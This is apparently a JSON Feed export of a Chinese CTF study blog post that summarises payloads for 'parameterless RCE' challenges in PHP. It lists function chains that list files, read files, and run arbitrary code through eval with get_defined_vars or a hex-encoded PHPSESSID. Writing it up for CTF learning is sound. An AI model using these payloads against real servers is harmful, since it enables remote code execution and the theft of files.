{
    "version": "https://jsonfeed.org/version/1",
    "title": "imFanqie • All posts by \"rce\" tag",
    "description": "学习博客",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/08/13/ctf/web/rce/ctfweb-%E6%97%A0%E5%8F%82RCE/",
            "url": "http://example.com/2021/08/13/ctf/web/rce/ctfweb-%E6%97%A0%E5%8F%82RCE/",
            "title": "ctfweb-无参RCE",
            "date_published": "2021-08-13T10:49:41.433Z",
            "content_html": "<p>最近做题遇到了几道无参数 RCE 的题，基本上还是不会，在此总结一下 payload</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<p><strong>常见提示：</strong></p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/[^\\W]+\\((?R)?\\)/'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span> $_GET<span class=\"token punctuation\">[</span><span class=\"token string\">'xxx'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>有这种屏蔽的，一般都是无参数 rce：</p>\n<ul>\n<li>(?R) 引用当前表达式，后面加了？递归调用。允许执行类似 <code>a(b(c()))</code>  格式的无参数函数；</li>\n</ul>\n<hr>\n<p><strong>常见方法：</strong></p>\n<p>1.<em> 查看当前目录下的文件</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">#pos () 函数可以替换为 current () 函数，一个意思</span></pre></td></tr></table></figure><p>2.<em> 暴露出数组中文件的名字，方便用函数读取</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">#原理就是随机生成键并反转，让名字暴露出来</span></pre></td></tr></table></figure><p>3.<em> 读取文件</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">#都可以试试</span></pre></td></tr></table></figure><p>4.<em> 进行命令执行输入</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">get_defined_vars</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>b<span class=\"token operator\">=</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>get_defined_vars (void) ，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量等</li>\n<li>curren () ，用于初始指向插入到数组中的第一个单元。</li>\n<li>end ()，作用是将 array 的内部指针移动到最后一个单元并返回其值。</li>\n<li>然后 eval () 执行命令即可。</li>\n</ul>\n<p>5.<em> 用 http headers 头部的 session 的函数获取 flag</em></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>配合 burp 即可，把要执行的代码 16 进制后输入 phpsessid</p>\n<hr>\n<p>后续遇到新的再补充</p>\n<p>END</p>\n",
            "tags": [
                "RCE"
            ]
        }
    ]
}